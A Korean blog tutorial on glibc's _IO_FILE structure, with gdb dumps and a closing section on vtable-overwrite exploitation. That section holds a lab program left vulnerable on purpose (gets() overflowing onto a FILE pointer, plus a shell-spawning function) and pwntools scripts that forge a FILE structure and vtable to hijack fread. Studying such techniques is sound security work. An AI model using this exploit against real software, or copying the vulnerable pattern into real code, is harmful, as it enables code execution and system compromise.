---
title: "_IO_FILE (File Structure)"
date: 2022-03-24 +0900
author: J0ngBae
categories: [PWNABLE]
tags: ['system hacking', 'iofile', '2022']
---

> `_IO_FILE` 은 리눅스 시스템의 표준 라이브러리에서 파일 스트림을 나타내기 위한 구조체이다. 이는 프로그램이 `fopen` 과 같은 함수를 통해 파일 스트림을 열 때 힙에 힐당된다.
{: .prompt-tip }

## \_IO\_FILE Structure

`file1.c` 는 `buf` 에 “THIS IS TESTFILE!” 문자열을 복사한 후, 파일을 쓰는 예제이다. `file1` 의 실행 결과는 다음과 같다.

- file1.c
    
    ```c
    // gcc -o file1 file1.c 
    #include <stdio.h>
    #include <unistd.h>
    #include <string.h>
    
    int main()
    {
    	FILE *fp;
    	char buf[256] = {0, };
    	strcpy(buf, "THIS IS TESTFILE!");
    	fp = fopen("testfile","w");
    	fwrite(buf, 1, strlen(buf), fp);
    	fclose(fp);
    
    	return 0;
    }
    ```
    

```zsh
╭─root@730ffeeff0e6 ~
╰─➤  cat testfile
THIS IS TESTFILE!
```

gdb를 통해 디버깅 해보면 `fopen` 함수를 통해 `_IO_FILE` 구조체가 할당된 것을 확인할 수 있다.

- Debugging
    
    ```bash
    [----------------------------------registers-----------------------------------]
    RAX: 0x602010 --> 0xfbad2484
    RBX: 0x0
    RCX: 0x7ffff7b04140 (<__open_nocancel+7>:       cmp    rax,0xfffffffffffff001)
    RDX: 0x0
    RSI: 0x7ffff7b9ac9f --> 0x7261003d7363632c (',ccs=')
    RDI: 0x602010 --> 0xfbad2484
    RBP: 0x7fffffffe630 --> 0x400740 (<__libc_csu_init>:    push   r15)
    RSP: 0x7fffffffe510 --> 0x7ffff7fee700 (0x00007ffff7fee700)
    RIP: 0x4006ce (<main+104>:      mov    QWORD PTR [rbp-0x118],rax)
    R8 : 0x4
    R9 : 0x1
    R10: 0x240
    R11: 0x246
    R12: 0x400570 (<_start>:        xor    ebp,ebp)
    R13: 0x7fffffffe710 --> 0x1
    R14: 0x0
    R15: 0x0
    EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
    [-------------------------------------code-------------------------------------]
       0x4006bf <main+89>:  mov    esi,0x4007c4
       0x4006c4 <main+94>:  mov    edi,0x4007c6
       0x4006c9 <main+99>:  call   0x400540 <fopen@plt>
    => 0x4006ce <main+104>: mov    QWORD PTR [rbp-0x118],rax
       0x4006d5 <main+111>: lea    rax,[rbp-0x110]
       0x4006dc <main+118>: mov    rdi,rax
       0x4006df <main+121>: call   0x400510 <strlen@plt>
       0x4006e4 <main+126>: mov    rsi,rax
    [------------------------------------stack-------------------------------------]
    0000| 0x7fffffffe510 --> 0x7ffff7fee700 (0x00007ffff7fee700)
    0008| 0x7fffffffe518 --> 0x0
    0016| 0x7fffffffe520 ("THIS IS TESTFILE!")
    0024| 0x7fffffffe528 ("TESTFILE!")
    0032| 0x7fffffffe530 --> 0x21 ('!')
    0040| 0x7fffffffe538 --> 0x0
    0048| 0x7fffffffe540 --> 0x0
    0056| 0x7fffffffe548 --> 0x0
    [------------------------------------------------------------------------------]
    Legend: code, data, rodata, value
    0x00000000004006ce in main ()
    gdb-peda$ x/100gx $rax
    0x602010:       0x00000000fbad2484      0x0000000000000000
    0x602020:       0x0000000000000000      0x0000000000000000
    0x602030:       0x0000000000000000      0x0000000000000000
    0x602040:       0x0000000000000000      0x0000000000000000
    0x602050:       0x0000000000000000      0x0000000000000000
    0x602060:       0x0000000000000000      0x0000000000000000
    0x602070:       0x0000000000000000      0x00007ffff7dd2540
    0x602080:       0x0000000000000003      0x0000000000000000
    0x602090:       0x0000000000000000      0x00000000006020f0
    0x6020a0:       0xffffffffffffffff      0x0000000000000000
    0x6020b0:       0x0000000000602100      0x0000000000000000
    0x6020c0:       0x0000000000000000      0x0000000000000000
    0x6020d0:       0x0000000000000000      0x0000000000000000
    0x6020e0:       0x0000000000000000      0x00007ffff7dd06e0
    0x6020f0:       0x0000000000000000      0x0000000000000000
    0x602100:       0x0000000000000000      0x0000000000000000
    0x602110:       0x0000000000000000      0x0000000000000000
    0x602120:       0x0000000000000000      0x0000000000000000
    0x602130:       0x0000000000000000      0x0000000000000000
    0x602140:       0x0000000000000000      0x0000000000000000
    0x602150:       0x0000000000000000      0x0000000000000000
    0x602160:       0x0000000000000000      0x0000000000000000
    0x602170:       0x0000000000000000      0x0000000000000000
    0x602180:       0x0000000000000000      0x0000000000000000
    0x602190:       0x0000000000000000      0x0000000000000000
    0x6021a0:       0x0000000000000000      0x0000000000000000
    0x6021b0:       0x0000000000000000      0x0000000000000000
    0x6021c0:       0x0000000000000000      0x0000000000000000
    0x6021d0:       0x0000000000000000      0x0000000000000000
    0x6021e0:       0x0000000000000000      0x0000000000000000
    0x6021f0:       0x0000000000000000      0x0000000000000000
    0x602200:       0x0000000000000000      0x0000000000000000
    0x602210:       0x0000000000000000      0x0000000000000000
    0x602220:       0x0000000000000000      0x0000000000000000
    0x602230:       0x00007ffff7dd0260      0x0000000000020dd1
    0x602240:       0x0000000000000000      0x0000000000000000
    0x602250:       0x0000000000000000      0x0000000000000000
    0x602260:       0x0000000000000000      0x0000000000000000
    0x602270:       0x0000000000000000      0x0000000000000000
    0x602280:       0x0000000000000000      0x0000000000000000
    0x602290:       0x0000000000000000      0x0000000000000000
    0x6022a0:       0x0000000000000000      0x0000000000000000
    0x6022b0:       0x0000000000000000      0x0000000000000000
    0x6022c0:       0x0000000000000000      0x0000000000000000
    0x6022d0:       0x0000000000000000      0x0000000000000000
    0x6022e0:       0x0000000000000000      0x0000000000000000
    0x6022f0:       0x0000000000000000      0x0000000000000000
    0x602300:       0x0000000000000000      0x0000000000000000
    0x602310:       0x0000000000000000      0x0000000000000000
    0x602320:       0x0000000000000000      0x0000000000000000
    ```
    
<br>
다음은 `_IO_FILE` 구조체의 정의이다.

```c
struct _IO_FILE
{
  int _flags;		/* High-order word is _IO_MAGIC; rest is flags. */

  /* The following pointers correspond to the C++ streambuf protocol. */
  char *_IO_read_ptr;	/* Current read pointer */
  char *_IO_read_end;	/* End of get area. */
  char *_IO_read_base;	/* Start of putback+get area. */
  char *_IO_write_base;	/* Start of put area. */
  char *_IO_write_ptr;	/* Current put pointer. */
  char *_IO_write_end;	/* End of put area. */
  char *_IO_buf_base;	/* Start of reserve area. */
  char *_IO_buf_end;	/* End of reserve area. */

  /* The following fields are used to support backing up and undo. */
  char *_IO_save_base; /* Pointer to start of non-current get area. */
  char *_IO_backup_base;  /* Pointer to first valid character of backup area */
  char *_IO_save_end; /* Pointer to end of non-current get area. */

  struct _IO_marker *_markers;

  struct _IO_FILE *_chain;

  int _fileno;
  int _flags2;
  __off_t _old_offset; /* This used to be _offset but it's too small.  */

  /* 1+column number of pbase(); 0 is unknown. */
  unsigned short _cur_column;
  signed char _vtable_offset;
  char _shortbuf[1];

  _IO_lock_t *_lock;
#ifdef _IO_USE_OLD_IO_FILE
};
```
<br>
이처럼 `_IO_FILE` 구조체에는 여러 멤버 변수들이 존재한다.

- _flags
    - 파일에 대한 읽기/쓰기/추가 권한을 의미한다. `0xfbad0000` 가 매직 값이며 하위 2바이트는 여러 비트 플래그들이다.
- _IO_read_ptr
    - 파일 읽기 버퍼에 대한 포인터이다.
- _IO_read_end
    - 파일 읽기 버퍼 주소의 끝을 가리키는 포인터이다.
- _IO_read_base
    - 파일 읽기 버퍼 주소의 시작을 가리키는 포인터이다.
- _IO_write_base
    - 파일 쓰기 버퍼 주소의 시작을 가리키는 포인터이다.
- _IO_write_ptr
    - 쓰기 버퍼에 대한 포인터이다.
- _IO_write_end
    - 파일 쓰기 버퍼 주소의 끝을 가리키는 포인터이다.
- _chain
    - 프로세스의 `_IO_FILE` 구조체는 `_chain` 필드를 통해 링크드 리스트를 만든다. 링크드 리스트의 헤더는 라이브러리의 전역 변수이 `_IO_list_all` 에 저장된다.
- _fileno
    - 파일 디스크럽터의 값이다.

### \_IO\_FILE flag
`_flags` 필드는 해당 파일이 가지고 있는 여러 성질들을 플래그로 나타내는 필드이다. glibc에서 정의된 `_flags` 의 주요 값들은 아래와 같다.

```c
#define _IO_MAGIC         0xFBAD0000 /* Magic number */
#define _IO_MAGIC_MASK    0xFFFF0000
#define _IO_USER_BUF          0x0001 /* Don't deallocate buffer on close. */
#define _IO_UNBUFFERED        0x0002
#define _IO_NO_READS          0x0004 /* Reading not allowed.  */
#define _IO_NO_WRITES         0x0008 /* Writing not allowed.  */
#define _IO_EOF_SEEN          0x0010
#define _IO_ERR_SEEN          0x0020
#define _IO_DELETE_DONT_CLOSE 0x0040 /* Don't call close(_fileno) on close.  */
#define _IO_LINKED            0x0080 /* In the list of all open files.  */
#define _IO_IN_BACKUP         0x0100
#define _IO_LINE_BUF          0x0200
#define _IO_TIED_PUT_GET      0x0400 /* Put and get pointer move in unison.  */
#define _IO_CURRENTLY_PUTTING 0x0800
#define _IO_IS_APPENDING      0x1000
#define _IO_IS_FILEBUF        0x2000
                           /* 0x4000  No longer used, reserved for compat.  */
#define _IO_USER_LOCK         0x8000
```

`file1.c` 에서 `_flags` 는 `0xfbad2484` 값을 가지고 있다. 이는 `0xfbad0000 + 0x2000 + 0x400 + 0x80 + 0x4` 로 나타낼 수 있다. 이들은 각각 `_IO_MAGIC` , `_IO_IS_FILEBUF`, `_IO_TIED_PUT_GET`, `_IO_LINKED`, `_IO_NO_READS` 를 의미한다. `file1.c` 에서 파일을 열 때 쓰기 모드로 열었기 때문에 `_flags` 에 `_IO_NO_READS` 가 있음을 알 수 있다.

이와 같은 파일의 플래그는 파일을 열어 해당하는 파일에 대한 `_IO_FILE` 구조체를 생성할 때 초기화된다. `fopen` 함수는 파일을 열 때 내부적으로 `_IO_new_file_fopen` 함수를 호출한다. 이 함수는 인자로 전달받은 `mode` 에 따라 플래그 값을 지정해 파일을 연다. 아래 코드는 `_IO_new_file_fopen` 함수 소스 코드의 일부이다.

```c
FILE * _IO_new_file_fopen (FILE *fp, const char *filename, const char *mode, int is32not64)
{
  int oflags = 0, omode;
  int read_write;
  int oprot = 0666;
  int i;
  FILE *result;
  const char *cs;
  const char *last_recognized;

  if (_IO_file_is_open (fp))
    return 0;
  switch (*mode)
    {
    case 'r':
      omode = O_RDONLY;
      read_write = _IO_NO_WRITES;
      break;
    case 'w':
      omode = O_WRONLY;
      oflags = O_CREAT|O_TRUNC;
      read_write = _IO_NO_READS;
      break;
    case 'a':
      omode = O_WRONLY;
      oflags = O_CREAT|O_APPEND;
      read_write = _IO_NO_READS|_IO_IS_APPENDING;
      break;
  ...
}
```

`mode` 값에 따라 각기 다른 플래그를 설정해 주는 것을 확인할 수 있다. `file1.c` 에서 파일을 열 때에는 `w` 모드를 통해 열었으므로 `_IO_NO_READS` 플래그가 설정된다.

이번에는 파일의 내용을 읽어 출력하는 예제이다.

`file2.c` 는 “testfile” 이라는 파일을 열어 `file_data` 에 256바이트 데이터를 입력받고 이를 출력한 후 스트림을 닫는 코드이다.

- file2.c
    
    ```c
    // gcc -o file2 file2.c 
    #include <stdio.h>
    
    int main()
    {
    	char file_data[256];
    	int ret;
    	FILE *fp;
    	
    	strcpy(file_data, "AAAA");
    	fp = fopen("testfile","r");
    	fread(file_data, 1, 256, fp);
    	printf("%s",file_data);
    
    	fclose(fp);
    }
    ```
    

`fread` 함수가 호출된 이후 `fp` 포인터의 `_IO_FILE` 구조체를 보자

- Debugging
    
    ```bash
    [----------------------------------registers-----------------------------------]
    RAX: 0x11
    RBX: 0x0
    RCX: 0x7ffff7b04360 (<__read_nocancel+7>:       cmp    rax,0xfffffffffffff001)
    RDX: 0x0
    RSI: 0x11
    RDI: 0x3
    RBP: 0x7fffffffe630 --> 0x400710 (<__libc_csu_init>:    push   r15)
    RSP: 0x7fffffffe510 --> 0x7ffff7fee700 (0x00007ffff7fee700)
    RIP: 0x4006ca (<main+100>:      lea    rax,[rbp-0x110])
    R8 : 0x21454c4946545345 ('ESTFILE!')
    R9 : 0x7fffffffe520 ("THIS IS TESTFILE!\t")
    R10: 0x7ffff7fee700 (0x00007ffff7fee700)
    R11: 0x246
    R12: 0x400570 (<_start>:        xor    ebp,ebp)
    R13: 0x7fffffffe710 --> 0x1
    R14: 0x0
    R15: 0x0
    EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
    [-------------------------------------code-------------------------------------]
       0x4006bd <main+87>:  mov    esi,0x1
       0x4006c2 <main+92>:  mov    rdi,rax
       0x4006c5 <main+95>:  call   0x400500 <fread@plt>
    => 0x4006ca <main+100>: lea    rax,[rbp-0x110]
       0x4006d1 <main+107>: mov    rsi,rax
       0x4006d4 <main+110>: mov    edi,0x40079f
       0x4006d9 <main+115>: mov    eax,0x0
       0x4006de <main+120>: call   0x400530 <printf@plt>
    [------------------------------------stack-------------------------------------]
    0000| 0x7fffffffe510 --> 0x7ffff7fee700 (0x00007ffff7fee700)
    0008| 0x7fffffffe518 --> 0x602010 --> 0xfbad2498
    0016| 0x7fffffffe520 ("THIS IS TESTFILE!\t")
    0024| 0x7fffffffe528 ("TESTFILE!\t")
    0032| 0x7fffffffe530 --> 0x921 ('!\t')
    0040| 0x7fffffffe538 --> 0x7fffffffe550 --> 0xffffffff
    0048| 0x7fffffffe540 --> 0x6562b026
    0056| 0x7fffffffe548 --> 0x7ffff7b99727 ("__vdso_getcpu")
    [------------------------------------------------------------------------------]
    Legend: code, data, rodata, value
    0x00000000004006ca in main ()
    gdb-peda$ x/100gx 0x602010
    0x602010:       0x00000000fbad2498      0x0000000000602240
    0x602020:       0x0000000000602240      0x0000000000602240
    0x602030:       0x0000000000602240      0x0000000000602240
    0x602040:       0x0000000000602240      0x0000000000602240
    0x602050:       0x0000000000603240      0x0000000000000000
    0x602060:       0x0000000000000000      0x0000000000000000
    0x602070:       0x0000000000000000      0x00007ffff7dd2540
    0x602080:       0x0000000000000003      0x0000000000000000
    0x602090:       0x0000000000000000      0x00000000006020f0
    0x6020a0:       0xffffffffffffffff      0x0000000000000000
    0x6020b0:       0x0000000000602100      0x0000000000000000
    0x6020c0:       0x0000000000000000      0x0000000000000000
    0x6020d0:       0x00000000ffffffff      0x0000000000000000
    0x6020e0:       0x0000000000000000      0x00007ffff7dd06e0
    0x6020f0:       0x0000000000000000      0x0000000000000000
    0x602100:       0x0000000000000000      0x0000000000000000
    0x602110:       0x0000000000000000      0x0000000000000000
    0x602120:       0x0000000000000000      0x0000000000000000
    0x602130:       0x0000000000000000      0x0000000000000000
    0x602140:       0x0000000000000000      0x0000000000000000
    0x602150:       0x0000000000000000      0x0000000000000000
    0x602160:       0x0000000000000000      0x0000000000000000
    0x602170:       0x0000000000000000      0x0000000000000000
    0x602180:       0x0000000000000000      0x0000000000000000
    0x602190:       0x0000000000000000      0x0000000000000000
    0x6021a0:       0x0000000000000000      0x0000000000000000
    0x6021b0:       0x0000000000000000      0x0000000000000000
    0x6021c0:       0x0000000000000000      0x0000000000000000
    0x6021d0:       0x0000000000000000      0x0000000000000000
    0x6021e0:       0x0000000000000000      0x0000000000000000
    0x6021f0:       0x0000000000000000      0x0000000000000000
    0x602200:       0x0000000000000000      0x0000000000000000
    0x602210:       0x0000000000000000      0x0000000000000000
    0x602220:       0x0000000000000000      0x0000000000000000
    0x602230:       0x00007ffff7dd0260      0x0000000000001011
    0x602240:       0x2053492053494854      0x454c494654534554
    0x602250:       0x0000000000000021      0x0000000000000000
    0x602260:       0x0000000000000000      0x0000000000000000
    0x602270:       0x0000000000000000      0x0000000000000000
    0x602280:       0x0000000000000000      0x0000000000000000
    0x602290:       0x0000000000000000      0x0000000000000000
    0x6022a0:       0x0000000000000000      0x0000000000000000
    0x6022b0:       0x0000000000000000      0x0000000000000000
    0x6022c0:       0x0000000000000000      0x0000000000000000
    0x6022d0:       0x0000000000000000      0x0000000000000000
    0x6022e0:       0x0000000000000000      0x0000000000000000
    0x6022f0:       0x0000000000000000      0x0000000000000000
    0x602300:       0x0000000000000000      0x0000000000000000
    0x602310:       0x0000000000000000      0x0000000000000000
    0x602320:       0x0000000000000000      0x0000000000000000
    ```
    

여러 멤버 변수에 포인터가 저장되어 있는 것을 알 수 있다. 이는 `_IO_FILE` 구조체의 원형에서 확인할 수 있듯 데이터를 읽고 쓸 때 사용되는 메모리 포인터인다. `0x602240` 메모리 주소에 어떤 값이 저장되어 있는지 확인해 보자.

```bash
gdb-peda$ x/s 0x0000000000602240
0x602240:       "THIS IS TESTFILE!"
```

포인터에는 실제 파일 내용이 저장되어 있다. `fread` 함수를 통해 정상적으로 파일 값을 읽어왔음을 알 수 있다.

지금까지 `_IO_FILE` 구조체에 대해 알아보았다. 그러나 실제로 파일 스트림을 열 때는 `_IO_FILE_plus` 구조체가 리턴된다. `_IO_FILE_plus` 구조체는 파일 스트림에서의 함수 호출을 용이하게 하기 위해 `_IO_FILE` 구조체에 함수 포인터 테이블을 가리키는 포인터를 추가한 구조체이다. 이는 아래와 같이 정의되어 있다.

```c
struct _IO_FILE_plus
{
  _IO_FILE file;
  const struct _IO_jump_t *vtable;
};
```

`_IO_jump_t` 에는 파일에 관련된 여러 동작을 수행하는 함수 포인터들이 저장되어 있다. 이들은 `fread` , `fwrite`, `open` 과 같은 표준 함수들에서 호출된다. `_IO_jump_t` 구조체에는 다음과 같이 여러 함수 포인터가 존재한다.

```c
const struct _IO_jump_t _IO_file_jumps libio_vtable =
{
  JUMP_INIT_DUMMY,
  JUMP_INIT(finish, _IO_file_finish),
  JUMP_INIT(overflow, _IO_file_overflow),
  JUMP_INIT(underflow, _IO_file_underflow),
  JUMP_INIT(uflow, _IO_default_uflow),
  JUMP_INIT(pbackfail, _IO_default_pbackfail),
  JUMP_INIT(xsputn, _IO_file_xsputn),
  JUMP_INIT(xsgetn, _IO_file_xsgetn),
  JUMP_INIT(seekoff, _IO_new_file_seekoff),
  JUMP_INIT(seekpos, _IO_default_seekpos),
  JUMP_INIT(setbuf, _IO_new_file_setbuf),
  JUMP_INIT(sync, _IO_new_file_sync),
  JUMP_INIT(doallocate, _IO_file_doallocate),
  JUMP_INIT(read, _IO_file_read),
  JUMP_INIT(write, _IO_new_file_write),
  JUMP_INIT(seek, _IO_file_seek),
  JUMP_INIT(close, _IO_file_close),
  JUMP_INIT(stat, _IO_file_stat),
  JUMP_INIT(showmanyc, _IO_default_showmanyc),
  JUMP_INIT(imbue, _IO_default_imbue)
};
```

`fread` 함수가 호출될 때 아래와 같이 vtable 내부의 함수 포인터들을 통해 저수준 동작을 수행하는 것을 확인할 수 있다.

```c
#define fread(p, m, n, s) _IO_fread (p, m, n, s)

size_t
_IO_fread (void *buf, size_t size, size_t count, FILE *fp) {
    ...
    bytes_read = _IO_sgetn (fp, (char *) buf, bytes_requested);
    ...
}

size_t
_IO_sgetn (FILE *fp, void *data, size_t n)
{
  /* FIXME handle putback buffer here! */
  return _IO_XSGETN (fp, data, n);
}

#define _IO_XSGETN(FP, DATA, N) JUMP2 (__xsgetn, FP, DATA, N)

#define JUMP2(FUNC, THIS, X1, X2) (_IO_JUMPS_FUNC(THIS)->FUNC) (THIS, X1, X2)

# define _IO_JUMPS_FUNC(THIS) (IO_validate_vtable (_IO_JUMPS_FILE_plus (THIS)))
```

`stdin`, `stdout`, `stderr` 세 파일 스트림은 프로세스가 시작할 때 라이브러리에 의해 기본적으로 생성되는 파일 스트림들이다.

```bash
gdb-peda$ x/30gx stdin
0x7ffff7dd18e0 <_IO_2_1_stdin_>:        0x00000000fbad2088      0x0000000000000000
0x7ffff7dd18f0 <_IO_2_1_stdin_+16>:     0x0000000000000000      0x0000000000000000
0x7ffff7dd1900 <_IO_2_1_stdin_+32>:     0x0000000000000000      0x0000000000000000
0x7ffff7dd1910 <_IO_2_1_stdin_+48>:     0x0000000000000000      0x0000000000000000
0x7ffff7dd1920 <_IO_2_1_stdin_+64>:     0x0000000000000000      0x0000000000000000
0x7ffff7dd1930 <_IO_2_1_stdin_+80>:     0x0000000000000000      0x0000000000000000
0x7ffff7dd1940 <_IO_2_1_stdin_+96>:     0x0000000000000000      0x0000000000000000
0x7ffff7dd1950 <_IO_2_1_stdin_+112>:    0x0000000000000000      0xffffffffffffffff
0x7ffff7dd1960 <_IO_2_1_stdin_+128>:    0x0000000000000000      0x00007ffff7dd3790
0x7ffff7dd1970 <_IO_2_1_stdin_+144>:    0xffffffffffffffff      0x0000000000000000
0x7ffff7dd1980 <_IO_2_1_stdin_+160>:    0x00007ffff7dd19c0      0x0000000000000000
0x7ffff7dd1990 <_IO_2_1_stdin_+176>:    0x0000000000000000      0x0000000000000000
0x7ffff7dd19a0 <_IO_2_1_stdin_+192>:    0x0000000000000000      0x0000000000000000
0x7ffff7dd19b0 <_IO_2_1_stdin_+208>:    0x0000000000000000      0x00007ffff7dd06e0

gdb-peda$ x/30gx stdout
0x7ffff7dd2620 <_IO_2_1_stdout_>:       0x00000000fbad2084      0x0000000000000000
0x7ffff7dd2630 <_IO_2_1_stdout_+16>:    0x0000000000000000      0x0000000000000000
0x7ffff7dd2640 <_IO_2_1_stdout_+32>:    0x0000000000000000      0x0000000000000000
0x7ffff7dd2650 <_IO_2_1_stdout_+48>:    0x0000000000000000      0x0000000000000000
0x7ffff7dd2660 <_IO_2_1_stdout_+64>:    0x0000000000000000      0x0000000000000000
0x7ffff7dd2670 <_IO_2_1_stdout_+80>:    0x0000000000000000      0x0000000000000000
0x7ffff7dd2680 <_IO_2_1_stdout_+96>:    0x0000000000000000      0x00007ffff7dd18e0
0x7ffff7dd2690 <_IO_2_1_stdout_+112>:   0x0000000000000001      0xffffffffffffffff
0x7ffff7dd26a0 <_IO_2_1_stdout_+128>:   0x0000000000000000      0x00007ffff7dd3780
0x7ffff7dd26b0 <_IO_2_1_stdout_+144>:   0xffffffffffffffff      0x0000000000000000
0x7ffff7dd26c0 <_IO_2_1_stdout_+160>:   0x00007ffff7dd17a0      0x0000000000000000
0x7ffff7dd26d0 <_IO_2_1_stdout_+176>:   0x0000000000000000      0x0000000000000000
0x7ffff7dd26e0 <_IO_2_1_stdout_+192>:   0x0000000000000000      0x0000000000000000
0x7ffff7dd26f0 <_IO_2_1_stdout_+208>:   0x0000000000000000      0x00007ffff7dd06e0

gdb-peda$ x/30gx stderr
0x7ffff7dd2540 <_IO_2_1_stderr_>:       0x00000000fbad2086      0x0000000000000000
0x7ffff7dd2550 <_IO_2_1_stderr_+16>:    0x0000000000000000      0x0000000000000000
0x7ffff7dd2560 <_IO_2_1_stderr_+32>:    0x0000000000000000      0x0000000000000000
0x7ffff7dd2570 <_IO_2_1_stderr_+48>:    0x0000000000000000      0x0000000000000000
0x7ffff7dd2580 <_IO_2_1_stderr_+64>:    0x0000000000000000      0x0000000000000000
0x7ffff7dd2590 <_IO_2_1_stderr_+80>:    0x0000000000000000      0x0000000000000000
0x7ffff7dd25a0 <_IO_2_1_stderr_+96>:    0x0000000000000000      0x00007ffff7dd2620
0x7ffff7dd25b0 <_IO_2_1_stderr_+112>:   0x0000000000000002      0xffffffffffffffff
0x7ffff7dd25c0 <_IO_2_1_stderr_+128>:   0x0000000000000000      0x00007ffff7dd3770
0x7ffff7dd25d0 <_IO_2_1_stderr_+144>:   0xffffffffffffffff      0x0000000000000000
0x7ffff7dd25e0 <_IO_2_1_stderr_+160>:   0x00007ffff7dd1660      0x0000000000000000
0x7ffff7dd25f0 <_IO_2_1_stderr_+176>:   0x0000000000000000      0x0000000000000000
0x7ffff7dd2600 <_IO_2_1_stderr_+192>:   0x0000000000000000      0x0000000000000000
0x7ffff7dd2610 <_IO_2_1_stderr_+208>:   0x0000000000000000      0x00007ffff7dd06e0
```

## _IO_FILE vtable overwrite

파일 함수가 호출되면 파일 포인터의 vtable에 있는 함수 포인터를 호출한다.

vtable 주소는 파일 포인터 내에 존재하기 때문에 vtable을 가리키는 주소를 바꾸거나 vtable의 값을 조작할 수 있으면 원하는 주소를 호출할 수 있다. 우분투 16.04 이후의 버전에서는 `_IO_vtable_check` 함수가 추가되었기 때문에 해당 방법아로는 공격하지 못한다.

`fp_vtable.c` 는 파일 포인터를 조작할 수 있는 버퍼 오버플로우 취약점이 존재한다. 파일 포인터가 가리키는 것은 파일 구조체가 할당된 영역이고, `fread` 함수가 호출 될 때에는 파일 포인터가 가리키는 `_IO_FILE` 구조체의 vtable 주소를 참조하여 호출한다. 전역 변수에서 발생하는 버퍼 오버플로우 취약점으로 파일 포인터를 `name` 버퍼 주소로 조작하면 해당 파일 포인터를 사용하는 파일 함수가 호출될 때 `name` 버퍼를 `_IO_FILE` 구조체로 오인하여 조작된 구조체를 사용하게 된다.

- fp_vtable.c
    
    ```c
    // gcc -o fp_vtable fp_vtable.c
    
    #include <stdio.h>
    #include <unistd.h>
    #include <stdlib.h>
    
    char name[256] = "\0";
    FILE *fp = NULL;
    
    void getshell() {
            system("/bin/sh");
    }       
    int main()
    {
            int bytes;
            char random[4];
            fp = fopen("/dev/urandom", "r");
    
            printf("Name: ");
            fflush(stdout);
    
            gets(name);
            
            fread(random, 1, 4, fp);
            
            printf("random: %s", random);
            return 0;
    }
    ```
    
- fp_test.py
    
    ```python
    #fp_test.py
    from pwn import *
    
    p = process("./fp_vtable")
    
    elf = ELF("fp_vtable")
    
    name_buf = elf.symbols['name']
    
    name = p64(0xfbad2488)
    name += p64(0)*13
    name += p64(3)
    name += p64(0)*2
    name += p64(name_buf + 0xe0)
    name += p64(0xffffffffffffffff)
    name += p64(0)*8
    name += p64(0x41414141) # vtable
    name += b"\x00"*(256-len(name))
    name += p64(name_buf)
    
    print(p.sendlineafter("Name:", name))
    
    p.interactive()
    ```
    

`fp_test.py` 를 보면 `name` 버퍼에 가짜 파일 구조체를 구성했다. 파일 함수가 참조하는 vtable을 `0x41414141` 로 조작하고, 파일 포인터를 가짜 파일 구조체를 구성한 `name` 버퍼를 가리키게 조작했다.

`fp_test.py` 를 실행하면 결과는 다음과 같다.

```bash
gdb-peda$ i r
rax            0x41414141       0x41414141
rbx            0x6010a0 0x6010a0
rcx            0x6010a0 0x6010a0
rdx            0x4      0x4
rsi            0x7ffd03800c20   0x7ffd03800c20
rdi            0x6010a0 0x6010a0
rbp            0x1      0x1
rsp            0x7ffd03800be8   0x7ffd03800be8
r8             0x601180 0x601180
r9             0x7ffd03800c20   0x7ffd03800c20
r10            0x7f2fb0204700   0x7f2fb0204700
r11            0x7f2fafc8c1b0   0x7f2fafc8c1b0
r12            0x4      0x4
r13            0x4      0x4
r14            0x0      0x0
r15            0x0      0x0
rip            0x7f2fafc99717   0x7f2fafc99717 <__GI__IO_sgetn+7>
eflags         0x10202  [ IF RF ]
cs             0x33     0x33
ss             0x2b     0x2b
ds             0x0      0x0
es             0x0      0x0
fs             0x0      0x0
gs             0x0      0x0
k0             0x0      0x0
k1             0x0      0x0
k2             0x0      0x0
k3             0x0      0x0
k4             0x0      0x0
k5             0x0      0x0
k6             0x0      0x0
k7             0x0      0x0

=> 0x7f2fafc99717 <__GI__IO_sgetn+7>:   mov    rax,QWORD PTR [rax+0x40]
   0x7f2fafc9971b <__GI__IO_sgetn+11>:  jmp    rax
```

`rax` 레지스터가 조작한 vtable의 주소인 `0x41414141` 로 바뀐 것을 확인할 수 있다.

이후에 명령어를 보면, `rax` 레지스터의 값에서 `0x40` 오프셋 뒤에 존재하는 값을 `rax` 에 옮긴 후 `jmp` 명령어를 통해  해당 주소로 점프한다.

이는 `fread` 가 `vtable + 0x40` 주소를 참조하여 호출하는 것을 의미한다.

이제 vtable이 가리키는 주소에 가짜 vtable을 만들면 원하는 함수를 호출할 수 있다.

다음은 파일 구조체를 조작한 결과이다.

- fp_vtable.py
    
    ```python
    #fp_vtable.py
    from pwn import *
    
    p = process("./fp_vtable")
    
    elf = ELF("fp_vtable")
    
    name_buf = elf.symbols['name']
    getshell = elf.symbols['getshell']
    
    # fake file structure 
    name = p64(0xfbad2488)
    name += p64(0)*13
    name += p64(3)
    name += p64(0)*2
    name += p64(name_buf + 0xe0)
    name += p64(0xffffffffffffffff)
    name += p64(0)*8
    name += p64(0x6011b0) # vtable
    name += "\x00"*(256-len(name))
    name += p64(name_buf)
    
    # fake vtable
    name += p64(0) # padding
    name += "\x00"*0x40
    name += p64(getshell) # sgetn location [rax + 0x40]
    
    print(p.sendlineafter("Name:", name))
    
    p.interactive()
    ```
    

```zsh
gdb-peda$ x/100gx 0x6010a0
0x6010a0 <name>:        0x00000000fbad2488      0x0000000000000000
0x6010b0 <name+16>:     0x0000000000000000      0x0000000000000000
0x6010c0 <name+32>:     0x0000000000000000      0x0000000000000000
0x6010d0 <name+48>:     0x0000000000000000      0x0000000000000000
0x6010e0 <name+64>:     0x0000000000000000      0x0000000000000000
0x6010f0 <name+80>:     0x0000000000000000      0x0000000000000000
0x601100 <name+96>:     0x0000000000000000      0x0000000000000000
0x601110 <name+112>:    0x0000000000000003      0x0000000000000000
0x601120 <name+128>:    0x0000000000000000      0x0000000000601180
0x601130 <name+144>:    0xffffffffffffffff      0x0000000000000000
0x601140 <name+160>:    0x0000000000000000      0x0000000000000000
0x601150 <name+176>:    0x0000000000000000      0x0000000000000000
0x601160 <name+192>:    0x0000000000000000      0x0000000000000000
0x601170 <name+208>:    0x0000000000000000      0x00000000006011b0
0x601180 <name+224>:    0x0000000000000000      0x0000000000000000
0x601190 <name+240>:    0x0000000000000000      0x0000000000000000
0x6011a0 <fp>:  0x00000000006010a0      0x0000000000000000
0x6011b0:       0x0000000000000000      0x0000000000000000
0x6011c0:       0x0000000000000000      0x0000000000000000
0x6011d0:       0x0000000000000000      0x0000000000000000
0x6011e0:       0x0000000000000000      0x0000000000000000
0x6011f0:       0x0000000000400736      0x0000000000000000
```

파일 포인터를 사용하는 함수가 있다면 `name` 버퍼를 참조하게 된다.

